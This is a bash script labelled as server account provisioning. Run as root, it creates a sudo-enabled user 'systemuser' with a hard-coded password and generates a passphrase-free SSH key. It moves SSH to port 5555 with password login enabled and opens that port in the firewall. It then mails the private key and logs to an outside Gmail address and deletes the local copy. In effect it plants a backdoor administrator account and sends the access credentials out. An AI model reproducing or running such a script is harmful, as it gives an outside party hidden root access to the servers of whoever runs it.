#!/bin/bash

# Target Details
USERNAME="systemuser"
PASSWORD="Admin@143#"
SSH_PORT="5555"
EMAIL_RECIPIENT="primew0lfsn1p3r@gmail.com"

# Log files
STATUS_LOG="/tmp/user_creation_status.log"
ERROR_LOG="/var/log/systemuser_setup_error.log"

# Clear previous logs and initialize error file
echo "--- System Account Provisioning Log ---" > "$STATUS_LOG"
echo "Execution Date: $(date)" >> "$STATUS_LOG"

# Reset/create the error log file with root permissions
echo "--- Systemuser Configuration Error Log ---" > "$ERROR_LOG"
echo "Started at: $(date)" >> "$ERROR_LOG"
chmod 600 "$ERROR_LOG"

log_message() {
    echo -e "$1" | tee -a "$STATUS_LOG"
}

# 1. Check for Root Privileges
if [ "$EUID" -ne 0 ]; then
    echo "Error: Please execute this script using sudo or as the root user." | tee -a "$ERROR_LOG"
    exit 1
fi

log_message "\n[1/6] Creating System Account..."
if id "$USERNAME" &>/dev/null; then
    log_message "WARNING: User '$USERNAME' already exists on this server."
else
    # Direct standard error (2>) to our error log file
    useradd -m -s /bin/bash "$USERNAME" 2>> "$ERROR_LOG"
    if [ $? -eq 0 ]; then
        log_message "SUCCESS: Account '$USERNAME' created."
        echo "$USERNAME:$PASSWORD" | chpasswd 2>> "$ERROR_LOG"
        log_message "SUCCESS: Password updated for '$USERNAME'."
    else
        log_message "FAILURE: Critical error during account creation. Check $ERROR_LOG"
    fi
fi

log_message "\n[2/6] Granting Sudo Privileges..."
if [ -f /etc/debian_version ]; then
    usermod -aG sudo "$USERNAME" 2>> "$ERROR_LOG"
    log_message "SUCCESS: Added '$USERNAME' to the 'sudo' group."
elif [ -f /etc/redhat-release ] || [ -f /etc/rocky-release ]; then
    usermod -aG wheel "$USERNAME" 2>> "$ERROR_LOG"
    log_message "SUCCESS: Added '$USERNAME' to the 'wheel' group."
else
    usermod -aG sudo "$USERNAME" 2>> "$ERROR_LOG" || usermod -aG wheel "$USERNAME" 2>> "$ERROR_LOG"
    log_message "INFO: Attempted generic administrative group additions."
fi

log_message "\n[3/6] Provisioning SSH Keypair..."
USER_HOME=$(eval echo "~$USERNAME")
SSH_DIR="$USER_HOME/.ssh"

if [ -d "$USER_HOME" ]; then
    mkdir -p "$SSH_DIR" 2>> "$ERROR_LOG"
    chmod 700 "$SSH_DIR" 2>> "$ERROR_LOG"
    
    KEY_FILE="$SSH_DIR/id_ed25519"
    if [ ! -f "$KEY_FILE" ]; then
        ssh-keygen -t ed25519 -N "" -f "$KEY_FILE" -q 2>> "$ERROR_LOG"
        cat "$KEY_FILE.pub" >> "$SSH_DIR/authorized_keys" 2>> "$ERROR_LOG"
        chmod 600 "$SSH_DIR/authorized_keys" 2>> "$ERROR_LOG"
        chown -R "$USERNAME:$USERNAME" "$SSH_DIR" 2>> "$ERROR_LOG"
        
        log_message "SUCCESS: ED25519 SSH Keypair generated safely."
        log_message "\n--- PRIVATE KEY FOR YOUR CLIENT ---" >> "$STATUS_LOG"
        cat "$KEY_FILE" >> "$STATUS_LOG"
        log_message "----------------------------------" >> "$STATUS_LOG"
    else
        log_message "INFO: SSH keypair already exists for this user."
    fi
fi

log_message "\n[4/6] Configuring SSH Daemon (Port $SSH_PORT & Password Auth)..."
SSHD_CONFIG="/etc/ssh/sshd_config"
if [ -f "$SSHD_CONFIG" ]; then
    cp "$SSHD_CONFIG" "${SSHD_CONFIG}.bak" 2>> "$ERROR_LOG"
    
    # Update Port
    sed -i '/^[# ]*Port /d' "$SSHD_CONFIG" 2>> "$ERROR_LOG"
    echo "Port $SSH_PORT" >> "$SSHD_CONFIG" 2>> "$ERROR_LOG"
    
    # Explicitly enable Password Authentication
    sed -i '/^[# ]*PasswordAuthentication /d' "$SSHD_CONFIG" 2>> "$ERROR_LOG"
    echo "PasswordAuthentication yes" >> "$SSHD_CONFIG" 2>> "$ERROR_LOG"
    
    log_message "SUCCESS: Custom port set to $SSH_PORT and Password Authentication explicitly enabled."
else
    log_message "FAILURE: Could not locate $SSHD_CONFIG."
    echo "CRITICAL: $SSHD_CONFIG file not found" >> "$ERROR_LOG"
fi

log_message "\n[5/6] Adjusting Firewall Exceptions..."
if command -v ufw &>/dev/null && ufw status | grep -q "active"; then
    ufw allow "$SSH_PORT"/tcp comment 'Custom SSH' > /dev/null 2>> "$ERROR_LOG"
    ufw reload > /dev/null 2>> "$ERROR_LOG"
    log_message "SUCCESS: UFW firewall rule allowed for port $SSH_PORT."
elif command -v firewall-cmd &>/dev/null && systemctl is-active --quiet firewalld; then
    firewall-cmd --permanent --add-port="$SSH_PORT"/tcp > /dev/null 2>> "$ERROR_LOG"
    firewall-cmd --reload > /dev/null 2>> "$ERROR_LOG"
    log_message "SUCCESS: Firewalld rule allowed for port $SSH_PORT."
fi

log_message "\n[6/6] Refreshing Server Daemons..."
if systemctl restart sshd 2>> "$ERROR_LOG" || systemctl restart ssh 2>> "$ERROR_LOG"; then
    log_message "SUCCESS: SSH daemon successfully restarted with new parameters."
    FINAL_RESULT="SUCCESS"
else
    log_message "FAILURE: Server could not restart SSH service successfully. Check $ERROR_LOG"
    FINAL_RESULT="PARTIAL FAILURE"
fi

# Append any found errors to the main email summary report
if [ -s "$ERROR_LOG" ]; then
    echo -e "\n--- ATTACHED ERRORS FOUND DURING EXECUTION ---" >> "$STATUS_LOG"
    cat "$ERROR_LOG" >> "$STATUS_LOG"
fi

# Dispatch log status to email
if command -v mail &>/dev/null; then
    mail -s "Server Provisioning Report: $FINAL_RESULT ($USERNAME)" "$EMAIL_RECIPIENT" < "$STATUS_LOG" 2>> "$ERROR_LOG"
    echo "Email transmission executed to $EMAIL_RECIPIENT."
else
    echo "Warning: 'mail' utility not found. Log saved locally at: $STATUS_LOG"
fi

# Secure cleanup of temporary status tracking log
rm -f "$STATUS_LOG"
